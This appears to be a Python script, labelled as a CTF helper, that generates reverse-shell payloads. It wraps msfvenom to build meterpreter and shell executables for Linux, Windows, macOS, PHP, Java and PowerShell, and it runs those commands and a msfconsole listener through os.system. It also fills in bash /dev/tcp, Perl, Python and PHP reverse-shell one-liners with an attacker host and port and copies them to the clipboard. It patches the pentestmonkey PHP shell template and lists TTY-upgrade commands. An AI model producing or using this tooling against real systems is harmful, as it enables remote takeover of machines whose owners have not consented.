#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# title           :shellcode.py
# description     :Help generate shellcode for a ctf
# author          :
# date            :
# version         :0.1
# usage           :python shellcode.py lhost lport
# =======================================================================

# Import the modules needed to run the script.
import os
import query_yes_no
import pyperclip
import argparse
import show_ips

parser = argparse.ArgumentParser(description='Build shellcode for multiple platforms.')

parser.add_argument('host', help='Host to use for the shellcode', nargs='?', default="127.0.0.1", type=str)
parser.add_argument('port', help='Port to use for the shellcode', nargs='?', default=1234, type=int)
parser.add_argument('--php_filename', help='php filename to save as', default='php-reverse-shell.php', type=str)
parser.add_argument('--msf_file_basename', help='msf filename to save as', default='shell', type=str)

args = parser.parse_args()


def msf_generate(payload):
    shell_code = "msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s" % (
        payload['payload'], args.host, args.port, payload['format'], payload['filename'])
    terminal = 'msfconsole -qx "use exploit/multi/handler;set payload %s;set LHOST %s;set LPORT %s;exploit"' % (
        payload['payload'], args.host, args.port)
    print("Generating payload: " + shell_code)
    os.system(shell_code)
    if query_yes_no.query_yes_no("Do you want to setup the listener?"):
        os.system(terminal)
    else:
        exit()


def php_file_pentestmonkey(payload=None):
    filename = args.php_filename
    dir = getcwd()
    fin = open(dir + "/php-reverse-shell-template.php")
    fout = open(filename, "wt")
    for line in fin:
        if '127.0.0.1' in line:
            fout.write(line.replace('127.0.0.1', str(args.host)))
        elif '1234' in line:
            fout.write(line.replace('1234', str(args.port)))
        else:
            fout.write(line)
    fin.close()
    fout.close()
    print("File created and updated as: " + filename)


# Other resources
# http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

# One liner shortcode
def oneliner(payload):
    print(payload['payload'] + " Copied to clipboard")
    pyperclip.copy(payload['payload'])
    exit()


payloads = [
    {
        'title': 'Reverse Shells',
        'generate_title': 'Select a payload to generate',
        'function': {'function_name': msf_generate},
        'submenu': [
            {
                "title": "",
                "payload": "linux/x86/meterpreter/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + ".elf"
            },
            {
                "title": "",
                "payload": "linux/x64/shell/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + "_64.elf"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_nonx_tcp",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "format": "exe",
                "filename": args.msf_file_basename + "_64.exe"
            },
            {
                "title": "",
                "payload": "osx/x86/shell_reverse_tcp",
                "format": "macho",
                "filename": args.msf_file_basename + ".dmg"
            },
            {
                "title": "",
                "payload": "osx/x64/shell_reverse_tcp",
                "format": "macho",
                "filename": args.msf_file_basename + "_64.dmg"
            },
            {
                "title": "",
                "payload": "php/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".php"
            },
            {
                "title": "",
                "payload": "python/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".py"
            },
            {
                "title": "",
                "payload": "java/jsp_shell_reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".jsp"
            },
            {
                "title": "",
                "payload": "java/jsp_shell_reverse_tcp",
                "format": "war",
                "filename": args.msf_file_basename + ".war"
            },
            {
                "title": "",
                "payload": "java/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".war"
            },
            {
                "title": "",
                "payload": "cmd/unix/reverse_bash",
                "format": "raw",
                "filename": args.msf_file_basename + ".sh"
            },
            {
                "title": "",
                "payload": "cmd/windows/powershell_reverse_tcp",
                "format": "ps1",
                "filename": args.msf_file_basename + ".ps1"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_http",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_https",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                'title': 'Bash Oneliner',
                'payload': 'bash -i >& /dev/tcp/{host}/{port} 0>&1'.format(host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'Perl Oneliner',
                'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (
                    args.host, args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'Python Oneliner',
                'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'PHP Oneliner',
                'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'PHP Oneliner V2',
                'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': '',
                'payload': 'Generate PHP file pentest monkey',
                'function': {'function_name': php_file_pentestmonkey}
            },
        ]
    },
    {
        'title': 'TTY Code',
        'generate_title': 'Select a TTY to generate',
        'function': {'function_name': oneliner},
        'submenu': [
            {
                'title': '',
                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\''
            },
            {
                'title': '',
                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\''
            },
            {
                'title': '',
                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\''
            },
            {
                'title': '',
                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\''
            },
            {
                'title': '',
                'payload': 'echo os.system(\'/bin/bash\')'
            },
            {
                'title': '',
                'payload': '/bin/sh -i'
            },
            {
                'title': '',
                'payload': 'perl: exec "/bin/sh";'
            },
        ]
    }
]


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


def getcwd():
    return os.path.dirname(os.path.realpath(__file__))


def main_menu(clear=True, items=None):
    if clear is True:
        cls()
    print("Working Directory is {dir},\n".format(dir=os.getcwd()))
    print("What code are you looking for?")
    for index, value in enumerate(items):
        print(str(index) + ": " + value['title'])
    footer(items)


# Execute menu
def exec_menu(choice, item=None):
    cls()
    ch = choice.lower()
    if ch == '' or ch == "00" or ch == "99":
        if ch == '' or ch == "99":
            main_menu(clear=True, items=payloads)
        elif ch == "00":
            exit()
    else:
        try:
            if item is None:
                raise KeyError
            if 'submenu' in item:
                handle_payloads(item)
        except KeyError:
            print("Invalid selection, please try again.\n")
            main_menu(clear=False, items=payloads)
    return


def footer_text():
    print("\n\n99. Home")
    print("00. Quit")


def footer(menu_items):
    footer_text()
    choice = input(" >>  ")
    selected_item = None
    for index, value in enumerate(menu_items):
        if choice == str(index):
            selected_item = value
    exec_menu(choice, selected_item)
    return


def handle_payloads(item):
    print(item['generate_title'])
    for index, value in enumerate(item['submenu']):
        if value['title'] != '':
            print(str(index) + ": " + value['title'])
        else:
            print(str(index) + ": " + value['payload'])
    footer_text()
    selected = input("Please select an option: ")
    if selected == "00" or selected == "99":
        exec_menu(selected)
        return
    selected_payload = None
    for index, value in enumerate(item['submenu']):
        if selected == str(index):
            selected_payload = value
    try:
        if selected_payload is None:
            raise
        # try function on individual items
        if 'function' in selected_payload and selected_payload['function'] is not None \
                and selected_payload['function']['function_name'] is not None:
            selected_payload['function']['function_name'](selected_payload)
            return
        # try main function that is defined fallback to main function
        elif 'function' in item and item['function'] is not None and item['function']['function_name'] is not None:
            item['function']['function_name'](selected_payload)
            return
        return
    except ValueError as e:
        print(e)
        print("Something went wrong please try again.")
        handle_payloads(item)


# Main Program
if __name__ == "__main__":
    # Launch main menu
    cls()
    show_ips.show_ips()
    main_menu(clear=False, items=payloads)
